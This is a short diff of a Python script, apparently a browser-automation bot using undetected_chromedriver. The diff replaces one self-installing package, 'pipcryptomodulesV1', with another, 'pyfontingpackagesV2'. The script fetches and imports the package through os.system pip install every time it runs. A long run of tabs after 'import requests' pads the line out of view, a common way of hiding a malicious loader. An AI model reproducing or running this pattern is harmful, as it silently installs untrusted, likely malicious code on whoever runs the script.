@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcryptomodulesV1")
-import pipcryptomodulesV1
+os.system("pip install pyfontingpackagesV2")
+import pyfontingpackagesV2
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
